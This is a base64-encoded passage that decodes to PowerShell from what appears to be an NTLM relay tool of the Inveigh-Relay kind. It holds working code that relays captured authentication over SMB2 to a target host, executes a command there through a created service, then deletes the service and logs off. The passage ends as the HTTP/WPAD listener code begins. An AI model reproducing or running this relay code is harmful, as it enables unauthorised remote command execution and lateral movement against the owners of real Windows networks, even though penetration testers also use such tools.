CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC5sb2dfb3V0cHV0KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBTTUIgcmVsYXkgc2VydmljZSAkU01CX3NlcnZpY2UgY3JlYXRpb24gZmFpbGVkIG9uICRUYXJnZXQiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9yZWxheV9mYWlsZWQgPSAkdHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAnRGVsZXRlU2VydmljZVcnCiAgICAgICAgICAgICAgICAgICAgICAgIHsgCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkU01CX2NsaWVudF9yZWNlaXZlWzEwOC4uMTExXSkgLWVxICcxZC0wNC0wMC0wMCcpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5BZGQoIlNNQiByZWxheSBjb21tYW5kIGV4ZWN1dGVkIG9uICRUYXJnZXQiKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC5maWxlX291dHB1dCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBTTUIgcmVsYXkgY29tbWFuZCBleGVjdXRlZCBvbiAkVGFyZ2V0IikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLmxvZ19vdXRwdXQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2cuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIFNNQiByZWxheSBjb21tYW5kIGV4ZWN1dGVkIG9uICRUYXJnZXQiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlaWYoW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkU01CX2NsaWVudF9yZWNlaXZlWzEwOC4uMTExXSkgLWVxICcwMi0wMC0wMC0wMCcpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5BZGQoIlNNQiByZWxheSBzZXJ2aWNlICRTTUJfc2VydmljZSBmYWlsZWQgdG8gc3RhcnQgb24gJFRhcmdldCIpCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLmZpbGVfb3V0cHV0KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuQWRkKCJTTUIgcmVsYXkgc2VydmljZSAkU01CX3NlcnZpY2UgZmFpbGVkIHRvIHN0YXJ0IG9uICRUYXJnZXQiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJGludmVpZ2gubG9nX291dHB1dCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZy5BZGQoIlNNQiByZWxheSBzZXJ2aWNlICRTTUJfc2VydmljZSBmYWlsZWQgdG8gc3RhcnQgb24gJFRhcmdldCIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9tZXNzYWdlX0lEICs9IDIwCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQjJfaGVhZGVyID0gR2V0LVBhY2tldFNNQjJIZWFkZXIgMHgwOSwweDAwICRTTUIyX21lc3NhZ2VfSUQgJFNNQjJfdHJlZV9JRCAkU01CX3Nlc3Npb25fSUQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CMl9oZWFkZXJbIlNNQjJIZWFkZXJfQ3JlZGl0UmVxdWVzdCJdID0gMHg3ZiwweDAwCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NDTV9kYXRhID0gR2V0LVBhY2tldFNDTURlbGV0ZVNlcnZpY2VXICRTTUJfc2VydmljZV9jb250ZXh0X2hhbmRsZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNDTV9kYXRhID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TQ01fZGF0YQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9SUENfZGF0YSA9IEdldC1QYWNrZXRSUENSZXF1ZXN0IDB4MDMgJFNDTV9kYXRhLkxlbmd0aCAwIDAgMHgwNCwweDAwLDB4MDAsMHgwMCAweDAwLDB4MDAgMHgwMiwweDAwCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkUlBDX2RhdGEgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1JQQ19kYXRhCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQjJfZGF0YSA9IEdldC1QYWNrZXRTTUIyV3JpdGVSZXF1ZXN0ICRTTUJfZmlsZV9JRCAoJFJQQ19kYXRhLkxlbmd0aCArICRTQ01fZGF0YS5MZW5ndGgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9oZWFkZXIgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1NNQjJfaGVhZGVyCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9kYXRhID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TTUIyX2RhdGEgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkUlBDX2RhdGFfbGVuZ3RoID0gJFNNQjJfZGF0YS5MZW5ndGggKyAkU0NNX2RhdGEuTGVuZ3RoICsgJFJQQ19kYXRhLkxlbmd0aAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9OZXRCSU9TX3Nlc3Npb25fc2VydmljZSA9IEdldC1QYWNrZXROZXRCSU9TU2Vzc2lvblNlcnZpY2UgJFNNQjJfaGVhZGVyLkxlbmd0aCAkUlBDX2RhdGFfbGVuZ3RoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X05ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zZW5kID0gJE5ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlICsgJFNNQjJfaGVhZGVyICsgJFNNQjJfZGF0YSArICRSUENfZGF0YSArICRTQ01fZGF0YQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RyZWFtLldyaXRlKCRTTUJfY2xpZW50X3NlbmQsMCwkU01CX2NsaWVudF9zZW5kLkxlbmd0aCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0cmVhbS5GbHVzaCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdHJlYW0uUmVhZCgkU01CX2NsaWVudF9yZWNlaXZlLDAsJFNNQl9jbGllbnRfcmVjZWl2ZS5MZW5ndGgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdGFnZSA9ICdSZWFkUmVxdWVzdCcKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0YWdlX25leHQgPSAnQ2xvc2VTZXJ2aWNlSGFuZGxlJwogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbG9zZV9zZXJ2aWNlX2hhbmRsZV9zdGFnZSA9IDEKICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgJ0Nsb3NlU2VydmljZUhhbmRsZScKICAgICAgICAgICAgICAgICAgICAgICAgewoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRTTUJfY2xvc2Vfc2VydmljZV9oYW5kbGVfc3RhZ2UgLWVxIDEpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5BZGQoIlNNQiByZWxheSBzZXJ2aWNlICRTTUJfc2VydmljZSBkZWxldGVkIG9uICRUYXJnZXQiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUIyX21lc3NhZ2VfSUQgKz0gMjAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2Nsb3NlX3NlcnZpY2VfaGFuZGxlX3N0YWdlKysKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NDTV9kYXRhID0gR2V0LVBhY2tldFNDTUNsb3NlU2VydmljZUhhbmRsZSAkU01CX3NlcnZpY2VfY29udGV4dF9oYW5kbGUKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJGludmVpZ2guZmlsZV9vdXRwdXQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gU01CIHJlbGF5IHNlcnZpY2UgJFNNQl9zZXJ2aWNlIGRlbGV0ZWQgb24gJFRhcmdldCIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC5sb2dfb3V0cHV0KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBTTUIgcmVsYXkgc2VydmljZSAkU01CX3NlcnZpY2UgZGVsZXRlZCBvbiAkVGFyZ2V0IikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUIyX21lc3NhZ2VfSUQgKz0gMQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0YWdlID0gJ0Nsb3NlUmVxdWVzdCcKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NDTV9kYXRhID0gR2V0LVBhY2tldFNDTUNsb3NlU2VydmljZUhhbmRsZSAkU01CX3NlcnZpY2VfbWFuYWdlcl9jb250ZXh0X2hhbmRsZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CMl9oZWFkZXIgPSBHZXQtUGFja2V0U01CMkhlYWRlciAweDA5LDB4MDAgJFNNQjJfbWVzc2FnZV9JRCAkU01CMl90cmVlX0lEICRTTUJfc2Vzc2lvbl9JRAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUIyX2hlYWRlclsiU01CMkhlYWRlcl9DcmVkaXRSZXF1ZXN0Il0gPSAweDdmLDB4MDAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTQ01fZGF0YSA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfU0NNX2RhdGEKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfUlBDX2RhdGEgPSBHZXQtUGFja2V0UlBDUmVxdWVzdCAweDAzICRTQ01fZGF0YS5MZW5ndGggMCAwIDB4MDUsMHgwMCwweDAwLDB4MDAgMHgwMCwweDAwIDB4MDAsMHgwMAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFJQQ19kYXRhID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9SUENfZGF0YSAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CMl9kYXRhID0gR2V0LVBhY2tldFNNQjJXcml0ZVJlcXVlc3QgJFNNQl9maWxlX0lEICgkUlBDX2RhdGEuTGVuZ3RoICsgJFNDTV9kYXRhLkxlbmd0aCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUIyX2hlYWRlciA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfU01CMl9oZWFkZXIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUIyX2RhdGEgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1NNQjJfZGF0YSAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRSUENfZGF0YV9sZW5ndGggPSAkU01CMl9kYXRhLkxlbmd0aCArICRTQ01fZGF0YS5MZW5ndGggKyAkUlBDX2RhdGEuTGVuZ3RoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X05ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlID0gR2V0LVBhY2tldE5ldEJJT1NTZXNzaW9uU2VydmljZSAkU01CMl9oZWFkZXIuTGVuZ3RoICRSUENfZGF0YV9sZW5ndGgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICROZXRCSU9TX3Nlc3Npb25fc2VydmljZSA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfTmV0QklPU19zZXNzaW9uX3NlcnZpY2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3NlbmQgPSAkTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgKyAkU01CMl9oZWFkZXIgKyAkU01CMl9kYXRhICsgJFJQQ19kYXRhICsgJFNDTV9kYXRhCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdHJlYW0uV3JpdGUoJFNNQl9jbGllbnRfc2VuZCwwLCRTTUJfY2xpZW50X3NlbmQuTGVuZ3RoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RyZWFtLkZsdXNoKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0cmVhbS5SZWFkKCRTTUJfY2xpZW50X3JlY2VpdmUsMCwkU01CX2NsaWVudF9yZWNlaXZlLkxlbmd0aCkKICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgJ0Nsb3NlUmVxdWVzdCcKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQjJfbWVzc2FnZV9JRCArPSAyMAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUIyX2hlYWRlciA9IEdldC1QYWNrZXRTTUIySGVhZGVyIDB4MDYsMHgwMCAkU01CMl9tZXNzYWdlX0lEICRTTUIyX3RyZWVfSUQgJFNNQl9zZXNzaW9uX0lECiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQjJfaGVhZGVyWyJTTUIySGVhZGVyX0NyZWRpdFJlcXVlc3QiXSA9IDB4N2YsMHgwMAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUIyX2RhdGEgPSBHZXQtUGFja2V0U01CMkNsb3NlUmVxdWVzdCAkU01CX2ZpbGVfSUQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUIyX2hlYWRlciA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfU01CMl9oZWFkZXIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUIyX2RhdGEgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1NNQjJfZGF0YQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9OZXRCSU9TX3Nlc3Npb25fc2VydmljZSA9IEdldC1QYWNrZXROZXRCSU9TU2Vzc2lvblNlcnZpY2UgJFNNQjJfaGVhZGVyLkxlbmd0aCAkU01CMl9kYXRhLkxlbmd0aAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE5ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9OZXRCSU9TX3Nlc3Npb25fc2VydmljZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc2VuZCA9ICROZXRCSU9TX3Nlc3Npb25fc2VydmljZSArICRTTUIyX2hlYWRlciArICRTTUIyX2RhdGEKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0cmVhbS5Xcml0ZSgkU01CX2NsaWVudF9zZW5kLDAsJFNNQl9jbGllbnRfc2VuZC5MZW5ndGgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdHJlYW0uRmx1c2goKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RyZWFtLlJlYWQoJFNNQl9jbGllbnRfcmVjZWl2ZSwwLCRTTUJfY2xpZW50X3JlY2VpdmUuTGVuZ3RoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RhZ2UgPSAnVHJlZURpc2Nvbm5lY3QnCiAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICdUcmVlRGlzY29ubmVjdCcKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQjJfbWVzc2FnZV9JRCArPSAxCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQjJfaGVhZGVyID0gR2V0LVBhY2tldFNNQjJIZWFkZXIgMHgwNCwweDAwICRTTUIyX21lc3NhZ2VfSUQgJFNNQjJfdHJlZV9JRCAkU01CX3Nlc3Npb25fSUQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CMl9oZWFkZXJbIlNNQjJIZWFkZXJfQ3JlZGl0UmVxdWVzdCJdID0gMHg3ZiwweDAwCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQjJfZGF0YSA9IEdldC1QYWNrZXRTTUIyVHJlZURpc2Nvbm5lY3RSZXF1ZXN0CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9oZWFkZXIgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1NNQjJfaGVhZGVyCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9kYXRhID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TTUIyX2RhdGEKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgPSBHZXQtUGFja2V0TmV0QklPU1Nlc3Npb25TZXJ2aWNlICRTTUIyX2hlYWRlci5MZW5ndGggJFNNQjJfZGF0YS5MZW5ndGgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICROZXRCSU9TX3Nlc3Npb25fc2VydmljZSA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfTmV0QklPU19zZXNzaW9uX3NlcnZpY2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3NlbmQgPSAkTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgKyAkU01CMl9oZWFkZXIgKyAkU01CMl9kYXRhCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdHJlYW0uV3JpdGUoJFNNQl9jbGllbnRfc2VuZCwwLCRTTUJfY2xpZW50X3NlbmQuTGVuZ3RoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RyZWFtLkZsdXNoKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0cmVhbS5SZWFkKCRTTUJfY2xpZW50X3JlY2VpdmUsMCwkU01CX2NsaWVudF9yZWNlaXZlLkxlbmd0aCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0YWdlID0gJ0xvZ29mZicKICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgJ0xvZ29mZicKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQjJfbWVzc2FnZV9JRCArPSAyMAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUIyX2hlYWRlciA9IEdldC1QYWNrZXRTTUIySGVhZGVyIDB4MDIsMHgwMCAkU01CMl9tZXNzYWdlX0lEICRTTUIyX3RyZWVfSUQgJFNNQl9zZXNzaW9uX0lECiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQjJfaGVhZGVyWyJTTUIySGVhZGVyX0NyZWRpdFJlcXVlc3QiXSA9IDB4N2YsMHgwMAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUIyX2RhdGEgPSBHZXQtUGFja2V0U01CMlNlc3Npb25Mb2dvZmZSZXF1ZXN0CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9oZWFkZXIgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1NNQjJfaGVhZGVyCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9kYXRhID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TTUIyX2RhdGEKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgPSBHZXQtUGFja2V0TmV0QklPU1Nlc3Npb25TZXJ2aWNlICRTTUIyX2hlYWRlci5MZW5ndGggJFNNQjJfZGF0YS5MZW5ndGgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICROZXRCSU9TX3Nlc3Npb25fc2VydmljZSA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfTmV0QklPU19zZXNzaW9uX3NlcnZpY2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3NlbmQgPSAkTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgKyAkU01CMl9oZWFkZXIgKyAkU01CMl9kYXRhCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdHJlYW0uV3JpdGUoJFNNQl9jbGllbnRfc2VuZCwwLCRTTUJfY2xpZW50X3NlbmQuTGVuZ3RoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RyZWFtLkZsdXNoKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0cmVhbS5SZWFkKCRTTUJfY2xpZW50X3JlY2VpdmUsMCwkU01CX2NsaWVudF9yZWNlaXZlLkxlbmd0aCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0YWdlID0gJ0V4aXQnCiAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICBpZigkU01CX3JlbGF5X2ZhaWxlZCkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuQWRkKCJTTUIgcmVsYXkgZmFpbGVkIG9uICRUYXJnZXQiKQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdGFnZSA9ICdFeGl0JwoKICAgICAgICAgICAgICAgICAgICAgICAgaWYoJGludmVpZ2guZmlsZV9vdXRwdXQpCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBTTUIgcmVsYXkgZmFpbGVkIG9uICRUYXJnZXQiKQogICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC5sb2dfb3V0cHV0KQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2cuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIFNNQiByZWxheSBmYWlsZWQgb24gJFRhcmdldCIpCiAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGlmKCEkU01CX3JlbGF5X2ZhaWxlZCAtYW5kICRSZWxheUF1dG9EaXNhYmxlIC1lcSAnWScpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuQWRkKCJTTUIgcmVsYXkgYXV0byBkaXNhYmxlZCBkdWUgdG8gc3VjY2VzcyIpCiAgICAgICAgICAgICAgICAkaW52ZWlnaC5TTUJfcmVsYXkgPSAkZmFsc2UKCiAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC5maWxlX291dHB1dCkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gU01CIHJlbGF5IGF1dG8gZGlzYWJsZWQgZHVlIHRvIHN1Y2Nlc3MiKQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLmxvZ19vdXRwdXQpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBTTUIgcmVsYXkgYXV0byBkaXNhYmxlZCBkdWUgdG8gc3VjY2VzcyIpCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICB9CgogICAgICAgIH0KICAgICAgICAKICAgICAgICAkU01CX3JlbGF5X3NvY2tldC5DbG9zZSgpCgogICAgICAgIHJldHVybiAkU01CX2NsaWVudF9yZWNlaXZlCiAgICB9Cgp9CgojIEhUVFAvSFRUUFMvUHJveHkgU2VydmVyIFNjcmlwdEJsb2NrCiRIVFRQX3NjcmlwdGJsb2NrID0gCnsgCiAgICBwYXJhbSAoJENoYWxsZW5nZSwkQ29tbWFuZCwkSFRUUElQLCRIVFRQUG9ydCwkSFRUUFJlc2V0RGVsYXksJEhUVFBSZXNldERlbGF5VGltZW91dCwkSFRUUFNfbGlzdGVuZXIsJFByb3h5LCRQcm94eUlnbm9yZSwkcHJveHlfbGlzdGVuZXIsJFJlbGF5QXV0b0Rpc2FibGUsJFNlcnZpY2UsJFNNQl92ZXJzaW9uLCRUYXJnZXQsJFVzZXJuYW1lcywkV1BBREF1dGgsJFdQQURBdXRoSWdub3JlLCRXUEFEUmVzcG9uc2UpCgogICAgZnVuY3Rpb24gTlRMTUN